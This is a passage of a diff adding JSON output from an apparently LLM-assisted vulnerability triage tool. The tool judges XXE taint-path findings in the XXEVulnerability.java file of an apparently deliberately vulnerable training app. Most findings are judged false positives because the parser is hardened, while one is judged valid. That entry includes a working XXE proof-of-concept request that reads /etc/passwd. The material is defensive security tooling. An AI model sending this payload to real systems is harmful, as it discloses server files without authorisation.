+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 77
+        }
+      ],
+      "verdict": "VALID",
+      "verdict_confidence": 0.94,
+      "vulnerability_type": "XML External Entity Injection",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(in)",
+      "data_flow_valid": true,
+      "sanitization_present": false,
+      "reasoning": "The HTTP request body is read directly via request.getInputStream() and passed to a JAXB Unmarshaller without any configuration to disable DTD processing or external entity resolution. JAXB's default behavior allows external entities, so an attacker can supply crafted XML that triggers XXE, leading to file disclosure, SSRF, or other impacts. No validation or sanitization steps are evident before the unmarshal call.",
+      "evidence": [
+        "InputStream in = request.getInputStream();",
+        "JAXBContext jc = JAXBContext.newInstance(ObjectFactory.class);",
+        "Unmarshaller jaxbUnmarshaller = jc.createUnmarshaller();",
+        "JAXBElement<Book> bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(in));"
+      ],
+      "poc": "POST /vulnerable/xxe/level1 HTTP/1.1\\nContent-Type: application/xml\\n\\n<?xml version=\\\"1.0\\\"?>\\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \\\"file:///etc/passwd\\\"> ]>\\n<book><title>&xxe;</title></book>",
+      "requires_dynamic_validation": true,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 6634,
+      "retry_count": 0,
+      "parse_success": true,
+      "generated_poc": {
+        "error": "Failed to generate valid PoC JSON"
+      }
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "request",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 172
+        },
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 172
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 172
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 178
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "bookJaxbElement",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        },
+        {
+          "code": "JAXBElement bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "request",
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))",
+        "<VAR_10>",
+        "<VAR_8><VAR_10>=(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))"
+      ],
+      "fingerprint": "b863bd3a3266c4027a70b0b60f5345a608b34c93bb54d82ce4e5eedbe051161a",
+      "context_hash": "6befd643241fcb4daa0a1817345b3b946b609573305600fa24650ea0accd3eda",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.91,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The code obtains attacker\u2011controlled XML from the HTTP request, but before parsing it configures a SAXParserFactory with the features \"http://xml.org/sax/features/external-general-entities\" and \"http://xml.org/sax/features/external-parameter-entities\" set to false. These settings disable resolution of external general and parameter entities, which are the primary vectors for XXE attacks. No further vulnerable processing occurs; the unmarshaller receives a SAXSource that cannot resolve external entities. Consequently, an attacker cannot trigger an XXE payload, making the finding a false positive.",
+      "evidence": [
+        "InputStream in = request.getInputStream(); // attacker\u2011controlled source",
+        "SAXParserFactory spf = SAXParserFactory.newInstance();",
+        "spf.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);",
+        "spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "jaxbUnmarshaller.unmarshal(xmlSource); // sink"
+      ],
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 28041,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 227
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 237
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "unmarshal(xmlSource)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "<FUNC_1>(<VAR_6>)"
+      ],
+      "fingerprint": "426d219dc29966054e3366c0e7bf8c4bc436393d3fc169f02d2f663435c472e0",
+      "context_hash": "f6c4b6912d9445067d204b760e7204a3d687573821d70010330edbf3f9a48889",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity Injection",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request input stream is passed to a SAXParserFactory that has the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true, XInclude disabled, and namespace awareness enabled. Disallowing DOCTYPE declarations blocks the definition of external entities, which is the primary vector for XXE attacks. The configured XMLReader is used to create a SAXSource that is then unmarshalled, so the protective configuration is enforced throughout the data flow. No bypassable validation is present, making the finding a false positive with high confidence.",
+      "evidence": [
+        "InputStream in = request.getInputStream();",
+        "spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
+        "spf.setXIncludeAware(false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "jaxbUnmarshaller.unmarshal(xmlSource);"
+      ],
+      "poc": null,
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 25049,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 227
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 227
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 237
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "bookJaxbElement",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        },
+        {
+          "code": "JAXBElement bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))",
+        "<VAR_10>",
+        "<VAR_8><VAR_10>=(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))"
+      ],
+      "fingerprint": "fafb085ff1b464c2f53269c6dd0df2e8e2b96bbe41a9fcc56a8eaebf841f7dad",
+      "context_hash": "5670531780f6e7ec345c9fd8e9ae9e23fd4963857c22f39261a01225f3b5fcb8",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The attacker\u2011controlled XML input is parsed using a SAXParserFactory that has the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true, namespace awareness enabled, and XInclude disabled. Disallowing DOCTYPE declarations prevents the definition of external entities, effectively mitigating XXE attacks. No further external entity loading features are enabled, so the unmarshaller operates on a safe parser instance. Consequently, the reported XXE finding is a false positive.",
+      "evidence": [
+        "InputStream in = request.getInputStream();",
+        "spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
+        "spf.setNamespaceAware(true);",
+        "spf.setXIncludeAware(false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "jaxbUnmarshaller.unmarshal(xmlSource);"
+      ],
+      "poc": null,
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 24998,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 199
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 207
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "(JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "bookJaxbElement",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        },
+        {
+          "code": "JAXBElement bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource))",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 109
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))",
+        "<VAR_10>",
+        "<VAR_8><VAR_10>=(<VAR_8><<VAR_9>>)(<VAR_7>.<ATTR_3>(<VAR_6>))"
+      ],
+      "fingerprint": "705b1daa4e7e5018d703a60416d628750b13f159857a18d59f26f9416c778ba2",
+      "context_hash": "442217b4e8a866fbf58bb1ad591e9f76bd83ecc6368436219747e2ec295ddcd3",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 109
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity (XXE)",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request body is passed to a SAXParserFactory that has the critical security features set: disallow-doctype-decl=true, external-parameter-entities=false, and load-external-dtd=false. These settings prevent processing of DOCTYPE declarations and external entities. The configured XMLReader is then used in a SAXSource supplied to JAXB unmarshaller, so the unmarshaller inherits the safe parser configuration. Consequently, attacker\u2011controlled XML cannot trigger an XXE attack, making the finding a false positive.",
+      "evidence": [
+        "InputStream in = request.getInputStream();",
+        "spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
+        "spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
+        "spf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "JAXBElement<Book> bookJaxbElement = (JAXBElement<Book>) (jaxbUnmarshaller.unmarshal(xmlSource));"
+      ],
+      "poc": "Send an XML payload containing a DOCTYPE with an external entity; the parser will reject the document due to disallow-doctype-decl being true, confirming the mitigation.",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 16267,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 199
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 199
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 207
+        },
+        {
+          "code": "InputStream in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 103
+        },
+        {
+          "code": "in",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "$obj4",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "spf.newSAXParser().getXMLReader()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 106
+        },
+        {
+          "code": "xmlSource",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "jaxbUnmarshaller",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        },
+        {
+          "code": "unmarshal(xmlSource)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "line": 110
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "<FUNC_1>()",
+        "<VAR_1>",
+        "<VAR_1>",
+        "<VAR_2><VAR_1>",
+        "<VAR_1>",
+        "$<VAR_3>",
+        "<<VAR_4>>",
+        "<VAR_5>.<ATTR_1>().<ATTR_2>()",
+        "<VAR_6>",
+        "<VAR_6>",
+        "<VAR_7>",
+        "<FUNC_2>(<VAR_6>)"
+      ],
+      "fingerprint": "ea8c899515c27217ad45f095c665075baa282803fe8d832866da03aa2135c6ff",
+      "context_hash": "513de2804f3295f43508c20ae7aa0514e24d4b5343f6b0a487f36fe1a3f162e3",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 199,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 147,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 227,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "source_line": 172,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
+          "sink_line": 110
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "XML External Entity Injection",
+      "cwe": "CWE-611",
+      "source": "request.getInputStream()",
+      "sink": "jaxbUnmarshaller.unmarshal(xmlSource)",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The code explicitly disables DOCTYPE declarations (disallow-doctype-decl=true) and turns off external entity processing (external-parameter-entities=false, load-external-dtd=false) on the SAXParserFactory before creating the XMLReader used by JAXB. These settings are the recommended hardening measures and effectively prevent an attacker\u2011controlled XML payload from triggering external entity resolution, thereby mitigating XXE. Consequently, the reported vulnerability is a false positive.",
+      "evidence": [
+        "SAXParserFactory spf = SAXParserFactory.newInstance();",
+        "spf.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);",
+        "spf.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);",
+        "spf.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);",
+        "Source xmlSource = new SAXSource(spf.newSAXParser().getXMLReader(), new InputSource(in));",
+        "jaxbUnmarshaller.unmarshal(xmlSource)"
+      ],
+      "poc": "N/A",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 30426,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "xxe",
+      "subtype": "CWE-611",
+      "path": [
+        {
+          "code": "getInputStream()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\xxe\\XXEVulnerability.java",
